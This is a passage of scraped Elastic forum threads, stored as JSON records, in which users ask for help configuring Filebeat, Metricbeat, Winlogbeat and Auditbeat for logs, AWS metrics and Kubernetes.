/go/src/github.com/elastic/beats/filebeat/channel/outlet.go:64 +0x7e github.com/elastic/beats/filebeat/channel.SubOutlet.func1(0xc000d242a0, 0x37331e0, 0xc000781e60) /go/src/github.com/elastic/beats/filebeat/channel/util.go:45 +0x10d created by github.com/elastic/beats/filebeat/channel.SubOutlet /go/src/github.com/elastic/beats/filebeat/channel/util.go:43 +0xf8",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "90b19abb-b718-4329-894d-9bf6e7a65f84",
    "url": "https://discuss.elastic.co/t/aws-metricbeat-config-access-denied/228548",
    "title": "AWS metricbeat config, Access Denied",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "kmroz",
    "date": "April 17, 2020, 4:30pm April 17, 2020, 9:46pm April 20, 2020, 4:25pm April 20, 2020, 6:11pm April 20, 2020, 6:12pm April 20, 2020, 6:16pm April 20, 2020, 6:24pm April 20, 2020, 7:09pm April 20, 2020, 7:14pm April 20, 2020, 8:22pm April 20, 2020, 8:26pm April 20, 2020, 10:11pm April 20, 2020, 10:11pm April 20, 2020, 11:05pm April 20, 2020, 11:06pm April 21, 2020, 1:48pm",
    "body": "Hello, I am trying to configure Metricbeat to collect AWS metrics. I have tried configuring it to use credential profile and even explicity setting the access keys inside the yml. It keeps saying I dont have enough permissions to DescribeRegions. I tried giving the user higher permissions which includes that and still the same issue. Any help on this would be great. I am also using the latest version of Elastic/Beats. - module: aws period: 1m metricsets: - elb - usage access_key_id: '' secret_access_key: '' credential_profile_name: default regions: - us-east-1 - module: aws period: 5m access_key_id: ''\" secret_access_key: ''\" credential_profile_name: default metricsets: - cloudwatch metrics: - namespace: AWS/EC2 #name: [\"CPUUtilization\", \"DiskWriteOps\"] #dimensions: # - name: InstanceId # value: i-0686946e22cf9494a #statistic: [\"Average\", \"Maximum\"] regions: - us-east-1 - module: aws period: 5m access_key_id: '' secret_access_key: '' metricsets: - ebs - ec2 - sns - sqs - rds regions: - us-east-1 - module: aws period: 12h access_key_id: '' secret_access_key: '' metricsets: - billing regions: - us-east-1 - module: aws period: 24h access_key_id: '' secret_access_key: '' metricsets: - s3_daily_storage - s3_request Thanks, Kenneth",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "50bfe94b-1e32-485f-b83c-0e3ca7fe03cf",
    "url": "https://discuss.elastic.co/t/filebeat-syslog-input-enable-both-tcp-udp-on-port-514/228671",
    "title": "Filebeat syslog input : enable both TCP + UDP on port 514",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "webfr",
    "date": "April 18, 2020, 8:31pm April 21, 2020, 1:35pm April 21, 2020, 1:34pm",
    "body": "Hello guys, I can't enable BOTH protocols on port 514 with settings below in filebeat.yml Does this input only support one protocol at a time? Nothing is written if I enable both protocols, I also tried with different ports. Filebeat directly connects to ES. # Syslog input filebeat.inputs: - type: syslog enabled: true max_message_size: 10KiB keep_null: true timeout: 10 protocol.udp: host: \"myhost.net:514\" filebeat.inputs: - type: syslog enabled: true max_message_size: 10KiB timeout: 10 keep_null: true protocol.tcp: host: \"myhost.net:514\" Log: 2020-04-18T20:39:12.200+0200 INFO [syslog] syslog/input.go:155 Starting Syslog input {\"protocol\": \"tcp\"} nothing in log regarding udp. Thanks for your help.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1d12bc97-b1a0-4461-aca1-0db3b60ebac2",
    "url": "https://discuss.elastic.co/t/evtx-windows-logs-to-es/228997",
    "title": "EVTX Windows logs to ES",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "cyberzlo",
    "date": "April 21, 2020, 9:14am April 21, 2020, 9:13am April 21, 2020, 12:09pm April 21, 2020, 1:23pm",
    "body": "Hi, what is most easy way to load static EVTX files to ES for forensics pourposes? Is there maybe some done setup for that? I just have dir with subdirectories for each system and in this subdirectories are evtx logs. Just want parse it and load to ES. Somehow I need distinguish logs between systems (are in different folders but EVTX file names are same for each system). Is it possible to automatic upload it with subdirectories?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "5273c165-a9da-4f20-9312-384e9298c1d2",
    "url": "https://discuss.elastic.co/t/multi-line-configuration-with-the-filebeat/227673",
    "title": "Multi-line configuration with the filebeat",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Ganesh_Bhosale",
    "date": "April 12, 2020, 1:49pm April 21, 2020, 12:24pm",
    "body": "Hello, I am having challenges to set up the filebeat to honor multiline configurations so I need your help. I am configuring filebeat to ship the logs from linux servers where large number of docker containers are running so I want to be selective about which container logs to enable for filebeat and I used \"hints.default_config.enabled: false\" for it from filebeat.autodiscover and utilized the docker labels to \"co.elastic.logs/enabled=true\" target docker containers. This works fine but I am unable to determine how to enable multiline configuration. I tried to leverage my \"container\" type in filebeat.input but with that multiline configuration works but logs of all of the containers starts shipping. In other words. filebeat ignores chosen targets via auto-discovery. filebeat.autodiscover: providers: - type: docker hints.enabled: true hints.default_config.enabled: false My entire filebeat.docker.yml file looks like this. filebeat.config: modules: path: ${path.config}/modules.d/*.yml reload.enabled: false filebeat.autodiscover: providers: - type: docker hints.enabled: true hints.default_config.enabled: false processors: - add_cloud_metadata: ~ - add_docker_metadata: host: \"unix:///var/run/docker.sock\" output.console: pretty: true Please suggest the how would I achieve multiline configuration while retaining auto discovery solution to select only appropriate docker containers through docker labels.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8f4f02e9-a1cb-4044-a1b3-4cd64481b6eb",
    "url": "https://discuss.elastic.co/t/filebeat-netflow-input-to-logstash-elastiflow-pipeline/229020",
    "title": "Filebeat Netflow Input to Logstash Elastiflow Pipeline",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "ksremo",
    "date": "April 21, 2020, 10:53am",
    "body": "I installed the elastiflow pipelines/module on my Logstash. The Netflow-Data is ingested in a Filebeat (input netflow) and then forwarded to a Logstash pipeline. In this Pipeline there is a switch/case on the log type. If type is netflow then the data is forwarded to a elastiflow pipeline. The data is indexed but in \"netflow-format\". The field mapping does not work. It seems that elastiflow plugin is online working correctly if i ingest in logstash directly (plain udp netflow traffic) Is there a workaround to do this? Maybe map the field directly in filebeat?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "910197c6-6f9f-43af-82af-5e44b240ee44",
    "url": "https://discuss.elastic.co/t/logs-with-time-difference-only-in-seconds-not-ordered-properly/228734",
    "title": "Logs with time difference only in seconds not ordered properly",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "haneefh",
    "date": "April 19, 2020, 1:58pm April 20, 2020, 8:29pm April 21, 2020, 6:18am April 21, 2020, 9:21am April 21, 2020, 10:31am",
    "body": "I am using filebeats to send logs. When log events with time differnce only in seconds do not appear properly in kibana. Below is my filbeat configuration. The latest logs appear first as of now in kibana, but for logs with time difference only in seconds dont appear right type: log enabled: true paths: /opt/atlassian/jira/logs/catalina.out fields: log_type: catalina log_application: atlassian_jira multiline.pattern: '^[0-9]{2}-[[:alpha:]]{3}-[0-9]{4}' multiline.negate: true multiline.match: after 18-Apr-2020 21:01:50.455 WARNING [http-nio-8080-exec-97] com.sun.jersey.spi.container.servlet.WebComponent.filterFor 18-Apr-2020 21:01:55.891 WARNING [http-nio-8080-exec-149] com.sun.jersey.spi.container",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "9c45b22b-d84d-4393-bd2d-5f9289a81b05",
    "url": "https://discuss.elastic.co/t/pipeline-definition-in-filebeat-yml-doesnt-work/229009",
    "title": "Pipeline definition in filebeat.yml doesn't work",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Burga",
    "date": "April 21, 2020, 9:47am April 21, 2020, 10:02am April 21, 2020, 10:12am",
    "body": "Hi , trying to configure filebeat to use pipeline , but it doesnt work my filebeat.yml pipeline configuration looks like this filebeat.inputs: - type: log paths: - /var/log/messages # - /var/log/*.log document_type: syslog fields: log_type: \"syslog\" enable: true fields_under_root: true pipeline: \"filebeat-7.6.1-system-auth-pipeline\" multiline.pattern: '^[0-9][0-9]:[0-9][0-9]:' multiline.negate: true multiline.match: after - type: log paths: - /var/log/secure # - /var/log/*.log document_type: syslog fields: log_type: \"secure\" enable: true pipeline: \"filebeat-7.6.1-system-auth-pipeline\" fields_under_root: true multiline.pattern: '^[0-9][0-9]:[0-9][0-9]:' multiline.negate: true multiline.match: after filebeat is up and working but it doesn't use pipeline need your assistance. Thanks in advance.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "04690c68-1350-448c-a604-ba3b39c42e01",
    "url": "https://discuss.elastic.co/t/parse-json-data-from-log-file-into-kibana-via-filebeat-and-logstash/228627",
    "title": "Parse json data from log file into Kibana via Filebeat and Logstash",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "theFatCat",
    "date": "April 18, 2020, 8:08am April 18, 2020, 10:24am April 18, 2020, 11:15am April 18, 2020, 1:48pm April 20, 2020, 5:01am April 20, 2020, 10:11am April 20, 2020, 11:56am April 20, 2020, 2:53pm April 21, 2020, 8:09am April 21, 2020, 9:17am",
    "body": "I am using Filebeat and Logstash for parsing json log file into Kibana. filebeat.inputs: - type: log enabled: true paths: - /home/tiennd/filebeat/logstash/*.json json.keys_under_root: true processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ - add_kubernetes_metadata: ~ - decode_json_fields: fields: [\"inner\"] Json log file's content: { \"outer\": \"value\", \"inner\": \"{\\\"data\\\": \\\"value\\\"}\" } I try to use Logstash Pipelines but this did not work. My error: Provided Grok expressions do not match field value: [{ \\\"outer\\\": \\\"value\\\", \\\"inner\\\": \\\"{\\\\\\\"data\\\\\\\": \\\\\\\"value\\\\\\\"}\\\" }] How can i setup json parsing for filebeat? Thank everyone!",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "54cc449e-ea8a-423a-ba4c-215c5962014c",
    "url": "https://discuss.elastic.co/t/how-to-implement-multiple-multiline-filters-in-filebeat-using-autodiscover/228978",
    "title": "How to implement multiple multiline filters in filebeat using autodiscover",
    "category": [
      "Beats"
    ],
    "author": "user2416",
    "date": "April 21, 2020, 7:13am",
    "body": "I have installed filebeat on kubernetes as deamonset to collect all kubernetes logs. we have different log patterns and also have to multiline filters of different kind of logs. I wrote autodiscover configuration matching kubernetes container name but its not working. Can someone please help me resolve this issue. my filebeat configuration apiVersion: v1 kind: ConfigMap metadata: name: filebeat-config namespace: test labels: k8s-app: filebeat kubernetes.io/cluster-service: \"true\" data: filebeat.yml: |- filebeat.config: prospectors: # Mounted `filebeat-prospectors` configmap: path: ${path.config}/prospectors.d/*.yml # Reload prospectors configs as they change: reload.enabled: false modules: path: ${path.config}/modules.d/*.yml # Reload module configs as they change: reload.enabled: false filebeat.autodiscover: providers: - type: kubernetes templates: - condition: equals: kubernetes.container.name: containername config: input: - type: container containers.ids: - \"${data.kubernetes.container.id}\" multiline.pattern: '^\\d{4}-\\d{2}-\\d{2}\\s\\d{2}:\\d{2}:\\d{2}.\\d{3}\\s' multiline.negate: true multiline.match: after processors: - add_cloud_metadata: output: logstash: hosts: - localhost:5044 --- apiVersion: v1 kind: ConfigMap metadata: name: filebeat-prospectors namespace: test labels: k8s-app: filebeat kubernetes.io/cluster-service: \"true\" data: kubernetes.yml: |- - type: log paths: - /var/lib/docker/containers/*/*.log json.message_key: log json.keys_under_root: true processors: - add_kubernetes_metadata: labels.dedot: true annotations.dedot: true in_cluster: true namespace: ${POD_NAMESPACE} - drop_fields: fields: [\"kubernetes.labels.app\"] - drop_event.when.regexp: or: - kubernetes.pod.name: \"test.*\" - drop_event: when: or: - equals: kubernetes.namespace: \"test\" --- apiVersion: extensions/v1beta1 kind: DaemonSet metadata: name: filebeat namespace: test labels: k8s-app: filebeat kubernetes.io/cluster-service: \"true\" spec: template: metadata: labels: k8s-app: filebeat kubernetes.io/cluster-service: \"true\" spec: serviceAccountName: filebeat terminationGracePeriodSeconds: 30 containers: - name: filebeat image: docker.elastic.co/beats/filebeat:6.0.1 args: [ \"-c\", \"/etc/filebeat.yml\", \"-e\", ] env: - name: POD_NAMESPACE valueFrom: fieldRef: fieldPath: metadata.namespace securityContext: runAsUser: 0 resources: limits: memory: 200Mi requests: cpu: 100m memory: 100Mi volumeMounts: - name: config mountPath: /etc/filebeat.yml readOnly: true subPath: filebeat.yml - name: prospectors mountPath: /usr/share/filebeat/prospectors.d readOnly: true - name: data mountPath: /usr/share/filebeat/data - name: varlibdockercontainers mountPath: /var/lib/docker/containers readOnly: true volumes: - name: config configMap: defaultMode: 0600 name: filebeat-config - name: varlibdockercontainers hostPath: path: /var/lib/docker/containers - name: prospectors configMap: defaultMode: 0600 name: filebeat-prospectors - name: data emptyDir: {} --- apiVersion: rbac.authorization.k8s.io/v1beta1 kind: ClusterRoleBinding metadata: name: filebeat subjects: - kind: ServiceAccount name: filebeat namespace: test roleRef: kind: ClusterRole name: filebeat apiGroup: rbac.authorization.k8s.io --- apiVersion: rbac.authorization.k8s.io/v1beta1 kind: ClusterRole metadata: name: filebeat labels: k8s-app: filebeat rules: - apiGroups: [\"\"] # \"\" indicates the core API group resources: - namespaces - pods verbs: - get - watch - list --- apiVersion: v1 kind: ServiceAccount metadata: name: filebeat namespace: test labels: k8s-app: filebeat ---",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "53040d33-7d08-48a8-99f9-477f6c74c46e",
    "url": "https://discuss.elastic.co/t/using-filebeat-modules-with-custom-fields/228909",
    "title": "Using filebeat modules with custom fields",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Burga",
    "date": "April 20, 2020, 5:41pm April 20, 2020, 6:11pm April 20, 2020, 6:13pm April 20, 2020, 11:11pm",
    "body": "Hi guys , I'm wondering , can I enable module and use fields in filebeat.yml file? I just configured filebeat input filebeat.inputs: - type: log paths: - /var/log/messages document_type: syslog fields: log_type: \"syslog\" enable: true fields_under_root: true multiline.pattern: '^[0-9][0-9]:[0-9][0-9]:' multiline.negate: true multiline.match: after ` `` but I can't start filebeat with module enabled . Best Regards.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d054a9d4-1783-4fff-907d-b3d08f540ed6",
    "url": "https://discuss.elastic.co/t/metricbeat-aws-cloudwatch-aws-elb/226089",
    "title": "Metricbeat AWS Cloudwatch & AWS ELB",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Anton91",
    "date": "April 1, 2020, 4:34pm April 2, 2020, 8:03am April 2, 2020, 5:18pm April 20, 2020, 10:21pm",
    "body": "Hello, everybody, unfortunately I do not get any data on AWS Cloudwatch & AWS ELB with Metricbeat. With AWS Cloudwatch I only get the data for EC2 and S3. All other modules work ec2,sqs,rds,ebs The following settings are stored: - module: aws period: 300s metrics sets: - cloudwatch metrics: - namespace: \"*\" credential_profile_name: default - module: aws period: 60s metrics sets: - elb credential_profile_name: default Cloudwatch is running and also metrics from ELB are displayed. The message I get: INFO [monitoring] log/log.go:145 Non-zero metrics in the last 30s {\"monitoring\": {\"metrics\": {\"beat\":{\"cpu\":{\"system\":{\"ticks\":31},\"total\":{\"ticks\":265,\"value\":265},\"user\":{\"ticks\":234}},\"handles\":{\"open\":387},\"info\":{\"ephemeral_id\":\"9744af87-3654-4685-a458-59f671a71409\",\"uptime\":{\"ms\":156252}},\"memstats\":{\"gc_next\":13588272,\"memory_alloc\":6796136,\"memory_total\":22810928,\"rss\":12288},\"runtime\":{\"goroutines\":25}},\"libbeat\":{\"config\":{\"module\":{\"running\":0}},\"pipeline\":{\"clients\":1,\"events\":{\"active\":0}}}}}} Does anyone have an idea?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "10691836-70b6-4611-8544-8bfb02d98900",
    "url": "https://discuss.elastic.co/t/generatecustombeat-logs-was-keep-rooling-with-mage-debug-generatecustombeat/228596",
    "title": "GenerateCustomBeat - logs was keep rooling with mage -debug GenerateCustomBeat",
    "category": [
      "Beats",
      "Beats Developers"
    ],
    "author": "",
    "date": "April 17, 2020, 11:52pm April 18, 2020, 3:55pm April 21, 2020, 1:13pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ded78624-4fa1-4f11-9281-7e6a4852a972",
    "url": "https://discuss.elastic.co/t/import-a-lot-of-wrong-data/228732",
    "title": "Import a lot of wrong data",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "zero.lim",
    "date": "April 19, 2020, 1:21pm April 20, 2020, 8:33pm",
    "body": "Hi all , I want to transfer the data of aws cloudwatch (cloudfront) to elasticsearch But I found that my elasticsearch has a lot of redundant information. Why? image189×539 5.88 KB image198×515 4.67 KB I don't want the information in the two pictures I only need the cloudfront information (filebeat runs every 5 minutes), and I do n’t want anything else. How should I set it up? What needs to be removed? thanks ...",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0b3ea631-2a16-4c86-8377-0a2c2cad7403",
    "url": "https://discuss.elastic.co/t/redis-module-redis-cluster-in-metricbeat/228836",
    "title": "Redis Module: Redis Cluster in Metricbeat",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Md_Saidur_Rahman",
    "date": "April 20, 2020, 10:30am April 20, 2020, 3:02pm April 20, 2020, 8:32pm",
    "body": "How to add Redis cluster for monitoring in the host section of /etc/metricbeat/modules.d/redis.yml file? Please be informed that I'm using single-node Redis cluster in different ports.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "cf41e059-a7bf-4a81-8236-daa831e1ec97",
    "url": "https://discuss.elastic.co/t/is-it-possible-to-get-a-template-for-kibana-that-includes-only-fields-related-to-activated-modules/228895",
    "title": "Is it possible to get a template for Kibana that includes only fields related to activated modules?",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Karel_Cech",
    "date": "April 20, 2020, 3:18pm April 20, 2020, 4:35pm April 20, 2020, 8:01pm",
    "body": "Hi, AFAIK, I have only the Apache module enabled. The command filebeat export template outputs a very long list of fields I'll never have in the index. Filebeat does not have access to Kibana, we use Logstash. But I did some tests and a filebeat's setup command created also a template full of these fields. Is it possible to get a template for Kibana that includes only fields related to activated modules? Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a6061362-b82e-45f0-a248-f8dc5ca2777c",
    "url": "https://discuss.elastic.co/t/7-6-2-requires-restart-of-server/228409",
    "title": "7.6.2 Requires Restart of Server",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "Nerbelir",
    "date": "April 16, 2020, 9:37pm April 17, 2020, 6:49am April 17, 2020, 8:35pm April 21, 2020, 2:05pm",
    "body": "I'm just getting around to setting up WinlogBeat. It appears if I used the msi installer or the traditional method, I only get the server to start when the server starts up. If I stop the service to make any changes to the config, I need to reboot the server. I am able to successfully pass the config test and if I run the .exe with the config file manually, it starts up just fine. Has anyone had this issue before?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f26663d1-562a-4267-a46b-5a17b5ea4e23",
    "url": "https://discuss.elastic.co/t/filebeat-uppercase-log-file-path/228552",
    "title": "Filebeat - Uppercase log file path",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "VSP",
    "date": "April 17, 2020, 4:38pm April 17, 2020, 5:50pm April 20, 2020, 6:41pm",
    "body": "Hi , new to filebeat. Been trying to send different types of logs through filebeat to Logstash -> Elasticsearch. While filebeat is able to read the path of a log file which is in lowercase, it failed to harvest an uppercase file path. Is there any specific configuration parameter to be set so that filebeat can pick these files?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d55d1baf-b2c9-44a1-ab5b-e62dc3dd75b8",
    "url": "https://discuss.elastic.co/t/metricbeat-incorrect-percentages-when-a-process-uses-multiple-cores-on-the-kibana-dashboard/228919",
    "title": "[Metricbeat] Incorrect percentages when a process uses multiple cores on the kibana dashboard",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "premierpsp",
    "date": "April 20, 2020, 6:39pm",
    "body": "Hi, When i have a process using multiples cores the percentage values ​​are wrong in Top Processes By CPU module. Top Output: Kibana dashboard (Top Processes By CPU module): I also cannot set the conditions for thresholds. If I select a condition it is not saved: Meanwhile, the CPU Usage Gauge is ok: Thank you guys.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "769f4552-1f13-46f0-b508-057b9a86fba1",
    "url": "https://discuss.elastic.co/t/how-to-load-external-configuration-file/228757",
    "title": "How to load external configuration file?",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "kelk",
    "date": "April 19, 2020, 7:10pm April 20, 2020, 5:01pm April 20, 2020, 5:46pm",
    "body": "hi we are trying to modularize all of the configurations as a standard. As per the https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-configuration-reloading.html link . I couldn't find a precise way of doing this for outputs, so my guess work was to # Put the below config into auditbeat.yml filebeat.config.outputs: enabled: true path: ouputs.d/*.yml And created an ouputs.d directory and put a my_ouputs.yml file in outputs.d. LICENSE.txt NOTICE.txt README.md auditbeat auditbeat.reference.yml auditbeat.yml data fields.yml kibana logs outputs.d Is this the correct way? I'm getting error Exiting: No outputs are defined. Please define one under the output section. Any ideas on modularizing the configs?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8c7b014e-5209-435b-8147-2d4a31c42cb5",
    "url": "https://discuss.elastic.co/t/start-with-custom-logs/228804",
    "title": "Start with custom logs",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "_mslo",
    "date": "April 20, 2020, 8:09am April 20, 2020, 3:47pm",
    "body": "Hi All, I'm starting with custom logs. Currently I put logs without any additional processing of log lines. My first problem is that I want search for \"ERROR\" but my logs look like: timestamp ERROR example message timestamp INFO example message finished without error By default _source.message is text type so when I try search for ERROR I receive both lines in output, as far as I know text type field is case-insensitive. I was looking for solutions in internet and now I have few concepts but not sure which is the best Dissect processor. Add processor to Filebeat. Example definition: - dissect: tokenizer: '%{timestamp} %{log_level} %{log_message}' But I'm not sure if it work with multiline, if it not problem if logs can contain .NET exception, because finally I think its good to have %{log_message} and exception in same field. And I don't know if multiline message has additional field for situation when we need to search for all errors and exceptions. 2. Add_field processor + regex, but it may require as many processors as log level (INFO, WARN, ERROR...) 3. Ingest node. Like in examples above I can try to split log line to different fields. I can copy and edit current module provided with Filebeat ant try to customize it for my case. 4. Change type of field _source.message to keyword type in Filebeat index settings, it should make field case-sensitive for search, but I'm not sure how it affect on Elasticsearch performance. Do you have idea which option is the best and why? Or maybe do you have better solution for that situation? I played with _search API in lots of way, but it not help me. Always searches was case-insensitive. I try to use different analyzer for query but it analyze my query only, not affect on result of search. For me it look like data stored in text field are saved as lowercase, but I don't understand why in search results my data looks not changed. Could you explain how it works? Additionally I want to ask you kindly if is there possibility to send logs from one log file to different index and rest of log files to filebeat index by one running Filebeat agent? And if yes how to do that? I want to play with my data, structure etc. but I don't want to make a mess in filebeat index. Even if I make a mess in default index I can override all index settings by agent, can't I? I'm using Elasticsearch and Filebeat in version 7.6 Thanks, Marcin",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "02133edd-5993-452a-9bda-160791129d74",
    "url": "https://discuss.elastic.co/t/is-there-way-to-pull-logs-from-remote-linux-server-instead-of-installing-filebeat-on-the-server-and-it-pushes-logs-to-logstash/228868",
    "title": "Is there way to pull logs from remote Linux server instead of installing filebeat on the server and it pushes logs to logstash?",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "bhagirath_h",
    "date": "April 20, 2020, 1:11pm April 20, 2020, 3:09pm",
    "body": "Rather than installing filebeat on each linux server and pushing the logs to logstash, I need some way to pull the logs from all linux servers having no need to install filebeat or any other plugin on the linux servers",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e92b2410-2177-4d33-989c-dc6e3ee90059",
    "url": "https://discuss.elastic.co/t/metricbeat-7-6-2-linux-fails-to-start-when-activemq-module-is-enabled/228546",
    "title": "Metricbeat-7.6.2-linux fails to start when activemq module is enabled",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "sm12356",
    "date": "April 20, 2020, 1:49pm April 20, 2020, 3:00pm",
    "body": "I am trying to enable the activemq module on metricbeat-7.6.2 on Linux but I keep getting the below error when I start metricbeat. 2020-04-17T16:00:26.399Z INFO instance/beat.go:445 metricbeat stopped. 2020-04-17T16:00:26.399Z ERROR instance/beat.go:933 Exiting: 3 errors: metricset 'activemq/broker' not found; metricset 'activemq/queue' not found; metricset 'activemq/topic' not found Exiting: 3 errors: metricset 'activemq/broker' not found; metricset 'activemq/queue' not found; metricset 'activemq/topic' not found I haven't changed anything in the activemq.yml apart from the host paramater. Any ideas what could be causing this error? I understand this module is still in beta so maybe there are still some issues with it.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "aa368ad9-0030-4d6b-9091-5499e118c322",
    "url": "https://discuss.elastic.co/t/filebeat-not-creating-new-index-in-elastic-search/228644",
    "title": "Filebeat not creating new index in Elastic search?",
    "category": [
      "Beats"
    ],
    "author": "pracks1982",
    "date": "April 18, 2020, 1:06pm April 20, 2020, 2:56pm",
    "body": "I have a microservice users-ws for which i want to see logs getting pulled by filebeat and send to elasticsearch and logstash for searching and filtering. I have a problem that with the configuration below its not creating new indexes .. filebeat.yml - filebeat.inputs: - type: log enabled: true paths: - C:\\my_projects\\PhotoAppAPIUsers\\users-ws.log fields: log_type: users-ws-log filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false setup.template.settings: index.number_of_shards: 1 output.elasticsearch: hosts: [\"localhost:9200\"] output.logstash: hosts: [\"localhost:5044\"] logstash conf : input { beats { port => 5044 } } filter { if [log_type] == \"users-ws-log\" { mutate { add_field => { \"[@metadata][target_index]\" => \"users-ws-log-%{+YYYY.MM}\" } } } else if [log_type] == \"albums-ws-log\" { mutate { add_field => { \"[@metadata][target_index]\" => \"albums-ws-log-% {+YYYY.MM.dd}\" } } } else { mutate { add_field => { \"[@metadata][target_index]\" => \"unknown-%{+YYYY}\" } } } } output { elasticsearch { hosts => [\"localhost:9200\"] index => \"%{[@metadata][target_index]}\" } stdout { codec => rubydebug} } Please let me know if i am missing any thing . Everytime i start my microservice though its generating new logs but i don't see new indexes getting created using filebeat. Below are the indexes everytime created : green open ilm-history-1-000001 g8nmTY7UQCiH7VDlSyQyQw 1 0 18 0 25.4kb 25.4kb yellow open filebeat-7.6.2-2020.04.17-000001 WMENcfDbRsGKNLjwMYIIzw 1 1 7432 0 1.5mb 1.5mb Also its not creating the indexes the way i have configured in logstash.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d2e818d7-c7a2-4f25-b080-c83ed8f6b1a9",
    "url": "https://discuss.elastic.co/t/beats-status-at-kibana-or-api/228167",
    "title": "Beats status at Kibana or API",
    "category": [
      "Beats"
    ],
    "author": "",
    "date": "April 15, 2020, 4:16pm April 16, 2020, 7:19am April 20, 2020, 2:04pm April 20, 2020, 2:04pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "5122569d-747b-4600-9dc0-8ae1f5093d8c",
    "url": "https://discuss.elastic.co/t/unable-to-setup-filebeat-dashboard-for-kibana/228410",
    "title": "Unable to setup filebeat dashboard for Kibana",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "ishan.abhinit",
    "date": "April 16, 2020, 9:44pm April 16, 2020, 9:42pm April 16, 2020, 9:45pm April 20, 2020, 1:47pm April 16, 2020, 10:25pm April 16, 2020, 10:26pm April 16, 2020, 10:28pm April 16, 2020, 10:33pm April 17, 2020, 6:21pm April 20, 2020, 1:52pm",
    "body": "I have set up elasticsearch , kibana and filebeat on the same CentOS VM. Both elasticsearch and kibana are running. Hostname of the CentOS VM is js-168-192.jetstream-cloud.org I am getting the below error when I run --> sudo filebeat setup --dashboards Loading dashboards (Kibana must be running and reachable) Exiting: error connecting to Kibana: fail to get the Kibana version: HTTP GET request to http://localhost:5601/api/status fails: fail to execute the HTTP GET request: Get http://localhost:5601/api/status: dial tcp [::1%lo]:5601: connect: connection refused. Response: . I have pasted the contents of kibana.yml and filebeat.yml below: Contents of kibana.yml file # Kibana is served by a back end server. This setting specifies the port to use. #server.port: 5601 # Specifies the address to which the Kibana server will bind. IP addresses and host names are both valid values. # The default is 'localhost', which usually means remote machines will not be able to connect. # To allow connections from remote users, set this parameter to a non-loopback address. server.host: \"js-168-192.jetstream-cloud.org\" # Enables you to specify a path to mount Kibana at if you are running behind a proxy. # Use the `server.rewriteBasePath` setting to tell Kibana if it should remove the basePath # from requests it receives, and to prevent a deprecation warning at startup. # This setting cannot end in a slash. #server.basePath: \"\" # Specifies whether Kibana should rewrite requests that are prefixed with # `server.basePath` or require that they are rewritten by your reverse proxy. # This setting was effectively always `false` before Kibana 6.3 and will # default to `true` starting in Kibana 7.0. #server.rewriteBasePath: false # The maximum payload size in bytes for incoming server requests. #server.maxPayloadBytes: 1048576 # The Kibana server's name. This is used for display purposes. #server.name: \"your-hostname\" # The URLs of the Elasticsearch instances to use for all your queries. #elasticsearch.hosts: [\"http://localhost:9200\"] # When this setting's value is true Kibana uses the hostname specified in the server.host # setting. When the value of this setting is false, Kibana uses the hostname of the host # that connects to this Kibana instance. #elasticsearch.preserveHost: true # Kibana uses an index in Elasticsearch to store saved searches, visualizations and # dashboards. Kibana creates a new index if the index doesn't already exist. #kibana.index: \".kibana\" # The default application to load. #kibana.defaultAppId: \"home\" # If your Elasticsearch is protected with basic authentication, these settings provide # the username and password that the Kibana server uses to perform maintenance on the Kibana # index at startup. Your Kibana users still need to authenticate with Elasticsearch, which # is proxied through the Kibana server. #elasticsearch.username: \"kibana\" #elasticsearch.password: \"pass\" # Enables SSL and paths to the PEM-format SSL certificate and SSL key files, respectively. # These settings enable SSL for outgoing requests from the Kibana server to the browser. #server.ssl.enabled: false #server.ssl.certificate: /path/to/your/server.crt #server.ssl.key: /path/to/your/server.key # Optional settings that provide the paths to 